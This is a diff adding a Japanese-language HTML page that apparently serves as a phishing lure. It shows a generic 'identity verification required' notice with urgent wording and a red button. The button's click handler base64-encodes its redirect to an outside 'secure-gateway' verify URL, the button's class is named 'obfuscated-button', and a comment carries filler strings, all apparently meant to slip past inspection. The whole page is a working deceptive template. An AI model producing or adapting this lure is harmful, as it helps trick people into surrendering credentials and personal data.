@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="ja-JP">
+<head>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ご本人確認</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', 'Arial', sans-serif;
+            background-color: #f5f5f5;
+            padding: 0;
+            margin: 0;
+        }
+        .container {
+            max-width: 600px;
+            margin: 20px auto;
+            background: #ffffff;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            overflow: hidden;
+        }
+        .header {
+            background: linear-gradient(135deg, #d32f2f 0%, #c62828 100%);
+            color: #ffffff;
+            padding: 35px 20px;
+            text-align: center;
+        }
+        .header h2 {
+            font-size: 26px;
+            margin: 0;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+        }
+        .content {
+            padding: 35px 25px;
+            color: #333333;
+            line-height: 1.7;
+        }
+        .content p {
+            margin: 14px 0;
+            font-size: 14px;
+            color: #555555;
+        }
+        .divider {
+            height: 1px;
+            background: linear-gradient(90deg, transparent, #ddd, transparent);
+            margin: 25px 0;
+        }
+        .obfuscated-button {
+            display: inline-block;
+            background: linear-gradient(135deg, #d32f2f 0%, #c62828 100%);
+            color: #ffffff;
+            padding: 14px 35px;
+            text-decoration: none;
+            border-radius: 6px;
+            font-size: 15px;
+            font-weight: 600;
+            margin-top: 20px;
+            margin-bottom: 20px;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 10px rgba(211, 47, 47, 0.3);
+            border: none;
+            cursor: pointer;
+            display: inline-block;
+            text-align: center;
+        }
+        .obfuscated-button:hover {
+            background: linear-gradient(135deg, #c62828 0%, #ad1d1d 100%);
+            box-shadow: 0 6px 15px rgba(211, 47, 47, 0.4);
+            transform: translateY(-2px);
+        }
+        .button-container {
+            text-align: center;
+            margin: 25px 0;
+        }
+        .footer {
+            padding: 15px 20px;
+            background: #fafafa;
+            border-top: 1px solid #eeeeee;
+            text-align: center;
+            font-size: 12px;
+            color: #888888;
+        }
+        .info-box {
+            background: #ffebee;
+            border-left: 4px solid #d32f2f;
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 4px;
+            font-size: 13px;
+            color: #b71c1c;
+        }
+    </style>
+</head>
+<body>
+    <!-- meta: kd-92-eryct | drvbyvbgvzgv -->
+    <div class="container">
+        <div class="header">
+            <h2>ご本人確認が必要です</h2>
+        </div>
+        
+        <div class="content">
+            <p>いつもご利用いただきありがとうございます。</p>
+            
+            <p>セキュリティ保護のため、ご本人確認が必要となります。</p>
+            
+            <div class="divider"></div>
+            
+            <div class="info-box">
+                <strong>重要：</strong> 本人確認プロセスをお進めください。
+            </div>
+            
+            <p>以下の手順でご確認をお願いいたします。</p>
+            
+            <div class="button-container">
+                <button class="obfuscated-button" onclick="window.location.href=atob('aHR0cHM6Ly9zZWN1cmUtZ2F0ZXdheS5jb20/YWN0aW9uPXZlcmlmeQ==');">
+                    ご本人確認を進める
+                </button>
+            </div>
+            
+            <div class="divider"></div>
+            
+            <p>プロセスを続行するには、上のボタンをクリックしてください。</p>
+        </div>
+        
+        <div class="footer">
+            <p>&copy; 2025 セキュアシステム. All rights reserved.</p>
+        </div>
+    </div>
+</body>
+</html>
+
